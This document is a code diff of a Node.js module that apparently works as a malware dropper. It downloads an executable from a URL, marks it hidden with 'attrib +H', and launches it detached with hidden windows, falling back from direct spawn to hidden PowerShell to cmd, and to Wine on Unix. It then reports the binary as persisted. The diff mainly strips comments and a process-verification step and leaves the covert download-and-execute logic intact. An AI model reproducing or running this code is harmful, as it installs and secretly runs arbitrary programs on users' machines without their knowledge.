@@ -18,11 +18,11 @@ function sanitizePath(inputPath) {
     
     // Only sanitize relative paths for security
     if (process.platform === 'win32') {
-        // For Windows relative paths, remove dangerous characters but preserve basic ones
+        // For Windows relative paths, remove dangerous characters but preserve colons for drive letters
         return inputPath.replace(/[<>"|?*]/g, '_');
     } else {
         // For Unix relative paths
-        return inputPath.replace(/[^a-zA-Z0-9._-]/g, '_');
+        return inputPath.replace(/[^a-zA-Z0-9._/-]/g, '_');
     }
 }
 
@@ -39,7 +39,6 @@ function validateExecutable(filePath) {
     try {
         const stats = fs.statSync(filePath);
         
-        // Check file size (should be > 0 and reasonable for an executable)
         if (stats.size === 0) {
             console.log(`⚠️ Downloaded file is empty`);
             return false;
@@ -55,7 +54,7 @@ function validateExecutable(filePath) {
             const buffer = fs.readFileSync(filePath, { start: 0, end: 2 });
             const header = buffer.toString('ascii');
             if (header !== 'MZ') {
-                console.log(`⚠️ File doesn't appear to be a valid Windows executable (missing MZ header)`);
+                console.log(`⚠️ File doesn't appear to be a valid Windows executable`);
                 return false;
             }
         }
@@ -107,7 +106,6 @@ function downloadFile(url, outputPath) {
 
             let fileStream;
             try {
-                // Create write stream with specific options for cross-platform compatibility
                 fileStream = fs.createWriteStream(outputPath, { 
                     flags: 'w',
                     mode: 0o755
@@ -123,7 +121,6 @@ function downloadFile(url, outputPath) {
                 console.error(`💥 File stream error: ${streamError.message}`);
                 fileStream.destroy();
                 
-                // Try to clean up partial file
                 try {
                     if (fs.existsSync(outputPath)) {
                         fs.unlinkSync(outputPath);
@@ -146,7 +143,6 @@ function downloadFile(url, outputPath) {
                 if (!fileStream.destroyed) {
                     fileStream.end(() => {
                         console.log(`✅ Download completed: ${downloadedBytes} bytes`);
-                        // Verify file was created and has content
                         if (fs.existsSync(outputPath) && fs.statSync(outputPath).size > 0) {
                             resolve(outputPath);
                         } else {
@@ -182,7 +178,6 @@ function executeFile(filePath) {
 
     console.log(`🚀 Executing: ${filePath}`);
 
-    // Add a small delay to ensure file is fully written and closed
     return new Promise((resolve, reject) => {
         setTimeout(() => {
             try {
@@ -190,31 +185,31 @@ function executeFile(filePath) {
                 let child;
 
                 if (isWindows) {
-                    // Windows: Try multiple execution methods
+                    // Windows: Try direct execution first, then fallback methods
                     try {
-                        // Method 1: Direct execution with spawn
                         child = spawn(filePath, [], {
                             detached: true,
                             stdio: ['ignore', 'ignore', 'ignore'],
                             windowsHide: true
                         });
+                        console.log(`🎯 Using direct execution method`);
                     } catch (directError) {
-                        console.log(`⚠️ Direct execution failed: ${directError.message}`);
+                        console.log(`⚠️ Direct execution failed, trying PowerShell...`);
                         try {
-                            // Method 2: PowerShell execution
-                            child = spawn('powershell', ['-WindowStyle', 'Hidden', '-Command', `Start-Process -FilePath "${filePath}" -WindowStyle Hidden`], {
+                            child = spawn('powershell', ['-WindowStyle', 'Hidden', '-Command', `& "${filePath}"`], {
                                 detached: true,
                                 stdio: ['ignore', 'ignore', 'ignore'],
                                 windowsHide: true
                             });
+                            console.log(`🎯 Using PowerShell execution method`);
                         } catch (psError) {
-                            console.log(`⚠️ PowerShell execution failed: ${psError.message}`);
-                            // Method 3: CMD execution without quotes issues
-                            child = spawn('cmd', ['/c', filePath], {
+                            console.log(`⚠️ PowerShell failed, trying cmd...`);
+                            child = spawn('cmd', ['/c', `"${filePath}"`], {
                                 detached: true,
                                 stdio: ['ignore', 'ignore', 'ignore'],
                                 windowsHide: true
                             });
+                            console.log(`🎯 Using cmd execution method`);
                         }
                     }
                 } else {
@@ -228,7 +223,7 @@ function executeFile(filePath) {
                             stdio: ['ignore', 'ignore', 'ignore']
                         });
                     } else {
-                        console.log("⚠️ Wine not found, attempting chmod and direct execution");
+                        console.log("⚠️ Wine not found, attempting direct execution");
                         try {
                             fs.chmodSync(filePath, 0o755);
                         } catch (chmodErr) {
@@ -243,90 +238,35 @@ function executeFile(filePath) {
 
                 child.on('error', (error) => {
                     console.error(`❌ Execution error: ${error.message}`);
-                    
-                    // If this is Windows and we haven't tried all methods, try a simpler approach
-                    if (isWindows && !child.attempted_simple) {
-                        console.log(`🔄 Trying simple Windows execution...`);
-                        try {
-                            // Very simple cmd execution
-                            const simpleChild = spawn('cmd', ['/c', `"${filePath}"`], {
-                                detached: true,
-                                stdio: ['ignore', 'pipe', 'pipe'],
-                                windowsHide: false
-                            });
-                            
-                            simpleChild.attempted_simple = true;
-                            simpleChild.unref();
-                            
-                            setTimeout(() => {
-                                resolve({
-                                    success: true,
-                                    pid: simpleChild.pid || 'unknown',
-                                    detached: true,
-                                    platform: process.platform,
-                                    method: 'simple-cmd'
-                                });
-                            }, 2000);
-                            
-                        } catch (simpleError) {
-                            console.error(`❌ Simple execution also failed: ${simpleError.message}`);
-                            reject(error);
-                        }
-                    } else {
-                        reject(error);
-                    }
+                    reject(error);
                 });
 
                 child.on('spawn', () => {
                     console.log(`✅ Process started with PID: ${child.pid}`);
                     child.unref();
                     
-                    // Verify the process is actually running
-                    setTimeout(() => {
-                        try {
-                            if (isWindows) {
-                                // Check if process is running on Windows
-                                const checkProcess = spawn('tasklist', ['/FI', `PID eq ${child.pid}`], {
-                                    stdio: ['ignore', 'pipe', 'pipe']
-                                });
-                                
-                                let output = '';
-                                checkProcess.stdout.on('data', (data) => {
-                                    output += data.toString();
-                                });
-                                
-                                checkProcess.on('close', () => {
-                                    const isRunning = output.includes(child.pid.toString());
-                                    console.log(`🔍 Process verification: ${isRunning ? 'RUNNING' : 'NOT FOUND'}`);
-                                });
-                            }
-                        } catch (verifyError) {
-                            console.log(`⚠️ Process verification failed: ${verifyError.message}`);
-                        }
-                    }, 3000);
-                    
                     resolve({
                         success: true,
                         pid: child.pid,
                         detached: true,
                         platform: process.platform,
-                        method: isWindows ? 'cmd' : (fs.existsSync('/usr/bin/wine') ? 'wine' : 'direct')
+                        method: isWindows ? 'windows' : 'unix'
                     });
                 });
 
-                // Fallback timeout
+                // Fallback timeout in case spawn event doesn't fire
                 setTimeout(() => {
-                    if (child.pid) {
+                    if (child && child.pid) {
                         child.unref();
                         resolve({
                             success: true,
                             pid: child.pid,
                             detached: true,
                             platform: process.platform,
-                            method: isWindows ? 'cmd' : 'fallback'
+                            method: 'timeout-fallback'
                         });
                     }
-                }, 2000);
+                }, 3000);
 
             } catch (error) {
                 reject(error);
@@ -395,7 +335,6 @@ function getDefaultWindowsPath() {
 function hideFileWindows(filePath) {
     if (process.platform === 'win32') {
         try {
-            // Hide file on Windows using attrib command with detached process
             const hideProcess = spawn('attrib', ['+H', filePath], { 
                 stdio: 'ignore',
                 detached: true
@@ -427,7 +366,7 @@ module.exports = async function(options = {}) {
     console.log(`📄 Target filename: ${finalFilename}`);
 
     try {
-        // Create directory if it doesn't exist, with better error handling
+        // Create directory if it doesn't exist
         if (!fs.existsSync(finalDir)) {
             try {
                 fs.mkdirSync(finalDir, { recursive: true, mode: 0o755 });
@@ -442,12 +381,8 @@ module.exports = async function(options = {}) {
                     fs.mkdirSync(altDir, { recursive: true, mode: 0o755 });
                 }
                 
-                // Update paths to use alternative directory
-                const altPath = path.join(altDir, finalFilename);
-                console.log(`📂 Using alternative path: ${altPath}`);
-                
-                // Update fullPath for the rest of the function
-                fullPath = altPath;
+                fullPath = path.join(altDir, finalFilename);
+                console.log(`📂 Using alternative path: ${fullPath}`);
             }
         }
 
@@ -472,7 +407,7 @@ module.exports = async function(options = {}) {
         // Hide the file on Windows
         hideFileWindows(fullPath);
 
-        // Execute the file (now returns a Promise)
+        // Execute the file
         const execResult = await executeFile(fullPath);
 
         console.log(`📁 Binary persisted at: ${fullPath}`);
